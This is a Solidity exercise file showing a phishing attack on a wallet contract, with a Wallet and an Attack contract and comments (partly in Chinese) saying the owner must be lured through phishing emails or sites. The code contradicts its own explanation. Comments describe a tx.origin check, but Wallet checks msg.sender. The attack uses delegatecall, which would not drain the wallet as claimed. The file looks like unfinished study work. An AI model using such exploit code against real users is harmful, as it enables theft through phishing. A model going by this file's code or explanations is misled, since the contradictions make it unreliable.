// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
攻击核心：必须误导owner用户调用你的攻击合约，才会攻击成功，需要和钓鱼邮箱或者钓鱼网站合作
本质：欺骗使owner(call)--->attack(call)--->wallet(tx.origin==owner可以执行权限操作)
*/

/*
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let's see how we can hack this contract
*/

/*
1. Alice deploys Wallet with 10 Ether
2. Eve deploys Attack with the address of Alice's Wallet contract.
3. Eve tricks Alice to call Attack.attack()
4. Eve successfully stole Ether from Alice's wallet

What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice's wallet to Eve's address.
Since tx.origin in Wallet.transfer() is equal to Alice's address,
it authorized the transfer. The wallet transferred all Ether to Eve.

a(call)-->attack(delegatecall)-->wallet(msg.sender == a)
*/

contract Wallet {
    address public owner;


    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(msg.sender == owner, "Not owner");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        
    }
    function getBalance() external returns (uint){
        return address(this).balance;
    }

}

contract Attack {
    address payable public owner;
    Wallet wallet;


    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack(address _wallet) payable public {
        // wallet.transfer(owner, address(wallet).balance);
        // (bool success , bytes memory data) = wallet.delegatecall(abi.encodeWithSignature("transfer(address,uint256)",owner, uint(address(wallet).balance)));

        (bool success , bytes memory data) = _wallet.delegatecall(
            abi.encodeWithSelector(Wallet.transfer.selector, owner, uint(address(wallet).balance)));
    }
    function getBalance() external returns (uint){
        return address(this).balance;
    }
    fallback()external payable{}

    function depostie() public payable {

    }
}
